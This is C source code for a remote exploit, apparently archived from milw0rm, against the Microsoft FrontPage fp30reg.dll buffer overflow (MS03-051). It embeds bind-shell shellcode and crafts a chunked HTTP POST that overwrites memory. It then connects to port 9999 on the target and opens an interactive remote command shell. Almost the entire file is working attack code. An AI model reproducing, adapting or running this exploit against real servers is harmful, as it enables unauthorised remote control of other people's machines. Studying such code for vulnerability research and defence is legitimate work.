/*******************************************************************************

Frontpage fp30reg.dll Overflow (MS03-051) discovered by Brett Moore

Exploit by Adik netmaniac hotmail kg

Binds persistent command shell on port 9999
Tested on 			
		Windows 2000 Professional SP3 English version 
		(fp30reg.dll ver 4.0.2.5526)			

-[ 13/Nov/2003 ]-
********************************************************************************/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define VER		"0.1"	

/******** bind shellcode spawns persistent shell on port 9999 *****************************/
unsigned char kyrgyz_bind_code[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a"
"\x02\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
"\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
"\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04"
"\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x2d\x8b"
"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
"\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3";


void cmdshell (int sock);
long gimmeip(char *hostname);

int main(int argc,char *argv[])
{     
		struct sockaddr_in targetTCP;
		struct hostent *host;
		int sockTCP,s;
		unsigned short port = 80;
		long ip;
		unsigned char header[]=	"POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n";
                                unsigned char packet[3000],data[1500];		                
		unsigned char ecx[] = "\xe0\xf3\xd4\x67";
		unsigned char edi[] = "\xff\xd0\x90\x90";		
		unsigned char call[] = "\xe4\xf3\xd4\x67";//overwrite .data section of fp30reg.dll
		unsigned char shortjmp[] = "\xeb\x10";
		
		printf("\n-={ Frontpage fp30reg.dll Overflow Exploit (MS03-051) ver %s }=-\n\n"
		" by Adik < netmaniac [at] hotmail.KG >\n\n", VER);
		if(argc < 2)
		{
			
			printf(" Usage: %s [Target] <port>\n"
					" eg: fp30reg.exe 192.168.63.130\n\n",argv[0]);
			return 1;			
		}		
		if(argc==3)
			port = atoi(argv[2]);					
		printf("[*] Target:\t%s \tPort: %d\n\n",argv[1],port);
		ip=gimmeip(argv[1]);	
        memset(&targetTCP, 0, sizeof(targetTCP));
		memset(packet,0,sizeof(packet));
        targetTCP.sin_family = AF_INET;
        targetTCP.sin_addr.s_addr = ip;
        targetTCP.sin_port = htons(port);				
	sprintf(packet,"%sHost: %s\r\nTransfer-Encoding: chunked\r\n",header,argv[1]);		
	memset(data, 0x90, sizeof(data)-1);
	data[sizeof(data)-1] = '\x0';
	memcpy(&data[16],edi,sizeof(edi)-1);
	memcpy(&data[20],ecx,sizeof(ecx)-1);		
	memcpy(&data[250+10],shortjmp,sizeof(shortjmp)-1);
	memcpy(&data[250+14],call,sizeof(call)-1);		
	memcpy(&data[250+70],kyrgyz_bind_code,sizeof(kyrgyz_bind_code));
	sprintf(packet,"%sContent-Length: %d\r\n\r\n%x\r\n%s\r\n0\r\n\r\n",packet,strlen(data),strlen(data),data);
        if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("[x] Socket not initialized! Exiting...\n");
                return 1;
		}
		printf("[*] Socket initialized...\n");					
		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("[*] Connection to host failed! Exiting...\n");
			exit(1);
		} 		
		printf("[*] Checking for presence of fp30reg.dll...");
		if (send(sockTCP, packet, strlen(packet),0) == -1)
		{
				printf("[x] Failed to inject packet! Exiting...\n");
                return 1;
		}		
		memset(packet,0,sizeof(packet));	
		if (recv(sockTCP, packet, sizeof(packet),0) == -1)		
		{
				printf("[x] Failed to receive packet! Exiting...\n");
                return 1;
		}				
		if(packet[9]=='1' && packet[10]=='0' && packet[11]=='0')
			printf(" Found!\n");
		else
		{
			printf(" Not Found!! Exiting...\n");
			return 1;
		}
		printf("[*] Packet injected!\n");
		close(sockTCP);
		printf("[*] Sleeping ");
		for(s=0;s<13000;s+=1000)
		{
			printf(". ");
			sleep(1000);
		}		
		printf("\n[*] Connecting to host: %s on port 9999",argv[1]);
		if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("\n[x] Socket not initialized! Exiting...\n");
                		return 1;
		}		
		targetTCP.sin_family = AF_INET;
        targetTCP.sin_addr.s_addr = ip;
        targetTCP.sin_port = htons(9999);
		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("\n[x] Exploit failed or there is a Firewall! Exiting...\n");
			exit(1);
		} 
		printf("\n[*] Dropping to shell...\n\n");
		cmdshell(sockTCP);
        return 0;
}
/*********************************************************************************/
void cmdshell (int sock)
{
 struct timeval tv;
 int length;
 unsigned long o[2];
 char buffer[1000];
 
 tv.tv_sec = 1;
 tv.tv_usec = 0;

 while (1) 
 {
	o[0] = 1;
	o[1] = sock;	

	length = select (0, (fd_set *)&o, NULL, NULL, &tv);
	if(length == 1)
	{
		length = recv (sock, buffer, sizeof (buffer), 0);
		if (length <= 0) 
		{
			printf ("[x] Connection closed.\n");
			return;
		}
		length = write (1, buffer, length);
		if (length <= 0) 
		{
			printf ("[x] Connection closed.\n");
			return;
		}
	}
	else
	{
		length = read (0, buffer, sizeof (buffer));
		if (length <= 0) 
		{
			printf("[x] Connection closed.\n");
			return;
		}
		length = send(sock, buffer, length, 0);
		if (length <= 0) 
		{
			printf("[x] Connection closed.\n");
			return;
		}
	}
}

}
/*********************************************************************************/
long gimmeip(char *hostname) 
{
	struct hostent *he;
	long ipaddr;
	
	if ((ipaddr = inet_addr(hostname)) < 0) 
	{
		if ((he = gethostbyname(hostname)) == NULL) 
		{
			printf("[x] Failed to resolve host: %s! Exiting...\n\n",hostname);
			exit(1);
		}
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}	
	return ipaddr;
}
/*********************************************************************************/

// milw0rm.com [2003-11-13]
